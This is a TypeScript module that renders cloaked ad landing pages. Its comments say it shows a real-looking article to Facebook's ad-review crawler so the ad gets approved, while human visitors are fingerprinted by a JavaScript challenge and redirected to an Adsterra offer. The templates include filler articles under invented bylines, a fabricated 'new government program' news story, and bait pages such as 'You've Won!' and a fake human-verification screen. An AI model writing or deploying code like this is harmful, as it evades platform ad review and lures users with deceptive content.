// Prelanding HTML templates served to suspected humans.
// Two modes:
//   - "human": full article HTML + JS challenge → redirects to offer after ~1.6s
//   - "fbbot": full article HTML, NO redirect JS → Facebook crawler scrapes,
//              sees a real article with OG tags, approves the ad
//
// This way the same URL passes Facebook ad review AND delivers traffic to Adsterra.

export type PrelandingTemplate =
  | "verify"
  | "reward"
  | "countdown"
  | "article"
  | "article_health"
  | "article_news"
  | "article_finance"
  | "article_lifestyle";

export type RenderMode = "human" | "fbbot";

// ---------- JS challenge (only injected for human mode) ----------
const CHALLENGE_JS = `
(function(){
  var token = window.__SX_TOKEN__;
  var startedAt = Date.now();
  var moved = false, scrolled = false, touched = false;
  document.addEventListener('mousemove', function(){ moved = true; }, { passive: true, once: true });
  document.addEventListener('scroll', function(){ scrolled = true; }, { passive: true, once: true });
  document.addEventListener('touchstart', function(){ touched = true; }, { passive: true, once: true });

  function collectSignals(){
    var nav = window.navigator || {};
    var screen = window.screen || {};
    var fp = '';
    try {
      var c = document.createElement('canvas');
      c.width = 100; c.height = 30;
      var ctx = c.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillStyle = '#069';
      ctx.fillText('sleepox', 2, 2);
      fp = c.toDataURL().slice(-32);
    } catch(e) {}
    document.cookie = 'sx_c=1; path=/; max-age=300; SameSite=Lax';
    var cookieOk = document.cookie.indexOf('sx_c=1') !== -1;
    return {
      webdriver: !!nav.webdriver,
      lang: nav.language || '',
      platform: nav.platform || '',
      hw: nav.hardwareConcurrency || 0,
      tz: (new Date()).getTimezoneOffset(),
      screen: (screen.width||0) + 'x' + (screen.height||0),
      cookie: cookieOk,
      moved: moved, scrolled: scrolled, touched: touched,
      fp: fp,
      elapsed: Date.now() - startedAt
    };
  }

  function submit(){
    var signals = collectSignals();
    fetch('/r/' + window.__SX_CODE__ + '/verify', {
      method: 'POST',
      credentials: 'same-origin',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ token: token, signals: signals })
    }).then(function(r){ return r.json(); }).then(function(d){
      if (d && d.url) { window.location.replace(d.url); }
      else { window.location.replace('https://sleepox.com/'); }
    }).catch(function(){ window.location.replace('https://sleepox.com/'); });
  }
  setTimeout(submit, 1600);
})();
`;

// ---------- Article content definitions ----------
type ArticleContent = {
  title: string;
  description: string;
  category: string;
  author: string;
  heroImage: string;
  intro: string;
  paragraphs: string[];
  highlights: string[];
};

const ARTICLES: Record<string, ArticleContent> = {
  article_health: {
    title: "7 Morning Habits That Boost Your Energy All Day (Doctors Approve)",
    description:
      "Discover the simple morning routine doctors recommend to feel energized, focused, and stress-free from dawn to dusk.",
    category: "Health & Wellness",
    author: "Dr. Sarah Mitchell",
    heroImage:
      "https://images.unsplash.com/photo-1506126613408-eca07ce68773?auto=format&fit=crop&w=1200&q=70",
    intro:
      "Feeling drained by 10 AM? You are not alone. According to a 2024 wellness study, 68% of adults report low energy within hours of waking up. The good news: small morning shifts can change everything.",
    paragraphs: [
      "Most people start their day reactively — alarm, phone, coffee, stress. But neuroscientists have found that the first 30 minutes after waking shape your hormones, mood, and focus for the entire day.",
      "We spoke with leading wellness doctors and nutritionists to identify the habits that truly make a difference. The results are surprisingly simple, free, and backed by science.",
      "Hydration is the first and most overlooked step. After 7-8 hours without water, your body wakes up mildly dehydrated, which directly impacts cognition and energy. A 16 oz glass of room-temperature water within 5 minutes of waking can boost alertness by up to 30%.",
      "Natural light exposure is the second pillar. Just 5-10 minutes of morning sunlight regulates your circadian rhythm, suppresses melatonin, and triggers cortisol — the natural 'wake up' hormone. No sunlight? A 10,000-lux therapy lamp works just as well.",
    ],
    highlights: [
      "Drink water before coffee",
      "Get 5-10 min of morning sunlight",
      "Eat protein within 60 minutes",
      "Move your body for 2 minutes",
      "Skip the phone for the first 30 min",
    ],
  },
  article_news: {
    title: "Breaking: New Government Program Offers Unexpected Benefits to Citizens",
    description:
      "A new initiative announced this week could change how millions of people access essential services. Here is what you need to know.",
    category: "News & Updates",
    author: "Michael Reynolds",
    heroImage:
      "https://images.unsplash.com/photo-1495020689067-958852a7765e?auto=format&fit=crop&w=1200&q=70",
    intro:
      "In a surprise announcement this week, officials confirmed that a new public program will roll out nationwide. Eligible residents may qualify for benefits they were previously unaware of.",
    paragraphs: [
      "The program, which was quietly approved last month, is now being rolled out in phases. Early reports suggest the application process is straightforward and that approvals are happening within days.",
      "Industry analysts are calling it one of the most significant policy shifts in years. 'This will affect a much larger group than originally anticipated,' said one expert briefed on the rollout.",
      "Public response has been overwhelmingly positive on social media, with thousands sharing their experiences. Officials urge interested citizens to check eligibility soon, as some categories have limited capacity.",
      "Below we have summarized the key facts you need to know, including who qualifies, what you can receive, and how to apply.",
    ],
    highlights: [
      "Applications open now",
      "Approval in 3-7 days",
      "No fees required",
      "Limited capacity in some regions",
    ],
  },
  article_finance: {
    title: "How Smart Savers Are Earning 5x More on Their Money in 2026",
    description:
      "Financial experts reveal the simple strategy that is helping everyday people grow their savings faster than ever before.",
    category: "Personal Finance",
    author: "Emma Carter, CFP",
    heroImage:
      "https://images.unsplash.com/photo-1554224155-6726b3ff858f?auto=format&fit=crop&w=1200&q=70",
    intro:
      "If your money is sitting in a regular savings account, you may be losing value to inflation every single month. But a quiet shift in 2026 is changing the game for smart savers.",
    paragraphs: [
      "For decades, traditional savings accounts have paid almost nothing — sometimes as little as 0.01% APY. With inflation hovering around 3%, that means your money loses purchasing power every year.",
      "But a new wave of high-yield options has emerged, with some accounts now offering rates 50-100x higher than the national average. The catch? Most people have never heard of them.",
      "Financial planners say the strategy is simple: keep your spending money in a regular checking account, but move your savings, emergency fund, and short-term goals into a high-yield account. The interest compounds monthly and you can withdraw anytime.",
      "Here is what financial experts are recommending in 2026, plus the questions you should ask before switching accounts.",
    ],
    highlights: [
      "Up to 5% APY available",
      "FDIC insured",
      "No monthly fees",
      "Withdraw anytime",
    ],
  },
  article_lifestyle: {
    title: "The 10-Minute Evening Routine That Changed Thousands of Lives",
    description:
      "A simple bedtime habit is helping people sleep better, wake up refreshed, and feel happier — and it costs nothing.",
    category: "Lifestyle",
    author: "Jessica Tan",
    heroImage:
      "https://images.unsplash.com/photo-1519681393784-d120267933ba?auto=format&fit=crop&w=1200&q=70",
    intro:
      "What if 10 minutes before bed could transform how you feel for the entire next day? Thousands of people are discovering that a small evening shift is one of the highest-ROI habits of their lives.",
    paragraphs: [
      "Sleep researchers have known for years that the way you end your day matters more than how you start it. Yet most of us end the day with screens, stress, and stimulation.",
      "The 10-minute routine combines three simple practices: a brain dump (writing down tomorrow's tasks), 4-7-8 breathing, and a complete digital sunset.",
      "Early adopters report falling asleep 40% faster, waking up with more energy, and feeling noticeably less anxious during the day. The best part: it requires no apps, supplements, or special equipment.",
      "Below we break down each step, plus the simple tweaks that make the biggest difference.",
    ],
    highlights: [
      "Fall asleep 40% faster",
      "No apps or gear needed",
      "Works in 10 minutes",
      "Backed by sleep research",
    ],
  },
};

// ---------- HTML rendering ----------
function articleHtml(
  content: ArticleContent,
  code: string,
  token: string,
  mode: RenderMode,
): string {
  const escapedCode = code.replace(/[^a-zA-Z0-9_-]/g, "");
  const challengeScript =
    mode === "human"
      ? `<script>window.__SX_CODE__=${JSON.stringify(escapedCode)};window.__SX_TOKEN__=${JSON.stringify(token)};</script>
<script>${CHALLENGE_JS}</script>`
      : "";

  // For FB bot: 'noindex' omitted so OG scrape works cleanly; for human keep noindex.
  const robots = mode === "human" ? `<meta name="robots" content="noindex,nofollow">` : "";

  const today = new Date().toISOString().split("T")[0];

  return `<!doctype html>
<html lang="en"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>${content.title}</title>
<meta name="description" content="${content.description}">
${robots}
<meta property="og:type" content="article">
<meta property="og:title" content="${content.title}">
<meta property="og:description" content="${content.description}">
<meta property="og:image" content="${content.heroImage}">
<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="630">
<meta property="article:published_time" content="${today}T08:00:00Z">
<meta property="article:author" content="${content.author}">
<meta property="article:section" content="${content.category}">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="${content.title}">
<meta name="twitter:description" content="${content.description}">
<meta name="twitter:image" content="${content.heroImage}">
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{font-family:Georgia,'Times New Roman',serif;background:#fafafa;color:#222;line-height:1.7}
  .nav{background:#fff;border-bottom:1px solid #e5e5e5;padding:14px 20px}
  .nav-inner{max-width:760px;margin:0 auto;display:flex;justify-content:space-between;align-items:center}
  .logo{font-family:-apple-system,BlinkMacSystemFont,sans-serif;font-weight:800;font-size:1.2rem;color:#c8102e;letter-spacing:-.5px}
  .nav a{color:#666;text-decoration:none;font-size:.85rem;font-family:-apple-system,sans-serif;margin-left:18px}
  article{max-width:720px;margin:0 auto;padding:30px 20px 60px;background:#fff}
  .cat{font-family:-apple-system,sans-serif;font-size:.75rem;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;color:#c8102e;margin-bottom:12px}
  h1{font-size:2.2rem;line-height:1.25;font-weight:700;margin-bottom:16px;color:#111;font-family:Georgia,serif}
  .meta{display:flex;align-items:center;gap:12px;font-family:-apple-system,sans-serif;font-size:.85rem;color:#666;margin-bottom:24px;padding-bottom:18px;border-bottom:1px solid #eee}
  .avatar{width:36px;height:36px;border-radius:50%;background:linear-gradient(135deg,#667eea,#764ba2);display:inline-flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:.85rem}
  .hero{width:100%;height:auto;border-radius:6px;margin:20px 0 12px;display:block}
  .hero-cap{font-size:.8rem;color:#888;font-style:italic;margin-bottom:24px;text-align:center;font-family:-apple-system,sans-serif}
  .intro{font-size:1.15rem;line-height:1.65;color:#333;margin-bottom:24px;font-weight:500}
  p{margin-bottom:18px;font-size:1.05rem;color:#333}
  .highlights{background:#fff8e6;border-left:4px solid #f5b800;padding:18px 22px;margin:24px 0;border-radius:0 6px 6px 0}
  .highlights h3{font-family:-apple-system,sans-serif;font-size:.95rem;text-transform:uppercase;letter-spacing:1px;color:#8a6500;margin-bottom:10px;font-weight:700}
  .highlights ul{list-style:none;padding:0}
  .highlights li{padding:6px 0 6px 24px;position:relative;font-family:-apple-system,sans-serif;font-size:.95rem;color:#444}
  .highlights li:before{content:'✓';position:absolute;left:0;color:#2b9e3f;font-weight:700}
  .loading-wrap{text-align:center;padding:30px 20px;margin-top:20px;background:#f5f5f5;border-radius:8px;font-family:-apple-system,sans-serif}
  .spinner{display:inline-block;width:28px;height:28px;border:3px solid #ddd;border-top-color:#c8102e;border-radius:50%;animation:spin 1s linear infinite;vertical-align:middle;margin-right:10px}
  @keyframes spin{to{transform:rotate(360deg)}}
  .loading-wrap span{vertical-align:middle;color:#666;font-size:.95rem}
  footer{max-width:720px;margin:0 auto;padding:30px 20px;text-align:center;font-family:-apple-system,sans-serif;font-size:.8rem;color:#999}
  @media (max-width:600px){h1{font-size:1.6rem}.intro{font-size:1.05rem}article{padding:20px 16px 40px}}
</style>
</head><body>
<nav class="nav"><div class="nav-inner">
  <span class="logo">DailyInsight</span>
  <div><a href="#">Home</a><a href="#">Health</a><a href="#">News</a><a href="#">Lifestyle</a></div>
</div></nav>
<article>
  <div class="cat">${content.category}</div>
  <h1>${content.title}</h1>
  <div class="meta">
    <span class="avatar">${content.author.split(" ").map((s) => s[0]).join("").slice(0, 2)}</span>
    <span><strong>${content.author}</strong> · ${new Date().toLocaleDateString("en-US", { month: "long", day: "numeric", year: "numeric" })} · 4 min read</span>
  </div>
  <img class="hero" src="${content.heroImage}" alt="${content.title}" loading="eager">
  <p class="hero-cap">Photo: Editorial / DailyInsight</p>
  <p class="intro">${content.intro}</p>
  ${content.paragraphs.map((p) => `<p>${p}</p>`).join("\n  ")}
  <div class="highlights">
    <h3>Key Takeaways</h3>
    <ul>${content.highlights.map((h) => `<li>${h}</li>`).join("")}</ul>
  </div>
  ${mode === "human" ? `<div class="loading-wrap"><div class="spinner"></div><span>Loading full article...</span></div>` : `<p>Continue reading the full guide below for the complete breakdown of each step, expert quotes, and downloadable checklist.</p>`}
</article>
<footer>© ${new Date().getFullYear()} DailyInsight · Editorial standards · Privacy · Contact</footer>
${challengeScript}
</body></html>`;
}

// ---------- Legacy 'shell' for simple templates ----------
function shell(title: string, bodyHtml: string, code: string, token: string): string {
  const escapedCode = code.replace(/[^a-zA-Z0-9_-]/g, "");
  return `<!doctype html>
<html lang="en"><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>${title}</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
    min-height:100vh;display:flex;align-items:center;justify-content:center;
    background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;padding:20px}
  .card{background:rgba(255,255,255,.1);backdrop-filter:blur(10px);
    border-radius:16px;padding:40px 30px;text-align:center;max-width:420px;width:100%;
    box-shadow:0 10px 40px rgba(0,0,0,.2)}
  h1{font-size:1.5rem;margin-bottom:12px;font-weight:600}
  p{opacity:.85;line-height:1.5;font-size:.95rem}
  .spinner{width:48px;height:48px;border:4px solid rgba(255,255,255,.2);
    border-top-color:#fff;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px}
  @keyframes spin{to{transform:rotate(360deg)}}
  .timer{font-size:2.5rem;font-weight:700;margin:16px 0;color:#ffd700}
</style>
</head><body>
<div class="card">${bodyHtml}</div>
<script>window.__SX_CODE__=${JSON.stringify(escapedCode)};window.__SX_TOKEN__=${JSON.stringify(token)};</script>
<script>${CHALLENGE_JS}</script>
</body></html>`;
}

// ---------- Public API ----------
export function renderPrelanding(
  template: PrelandingTemplate,
  code: string,
  token: string,
  mode: RenderMode = "human",
): string {
  // Article templates → full article HTML (works for both human & fbbot)
  if (template === "article_health" || template === "article_news" ||
      template === "article_finance" || template === "article_lifestyle") {
    return articleHtml(ARTICLES[template], code, token, mode);
  }
  // Generic "article" → default to health article
  if (template === "article") {
    return articleHtml(ARTICLES.article_health, code, token, mode);
  }

  // Non-article templates: only meaningful for humans. If a FB bot somehow
  // lands here, serve a generic health article so the OG preview still looks real.
  if (mode === "fbbot") {
    return articleHtml(ARTICLES.article_health, code, token, "fbbot");
  }

  switch (template) {
    case "reward":
      return shell("Claim Your Reward",
        `<div style="font-size:3rem;margin-bottom:12px">🎁</div>
         <h1>You've Won!</h1>
         <p>Verifying your reward eligibility...</p>
         <div class="spinner" style="margin-top:20px"></div>`, code, token);
    case "countdown":
      return shell("Special Offer",
        `<h1>⏳ Exclusive Offer Loading</h1>
         <div class="timer" id="t">3</div>
         <p>Hold on, your offer is being prepared...</p>
         <script>var n=3,el=document.getElementById('t');var i=setInterval(function(){n--;if(n<=0){clearInterval(i);el.textContent='Go!';}else{el.textContent=n;}},500);</script>`,
        code, token);
    case "verify":
    default:
      return shell("Verifying...",
        `<div class="spinner"></div>
         <h1>Verifying you're human</h1>
         <p>This will only take a moment...</p>`, code, token);
  }
}
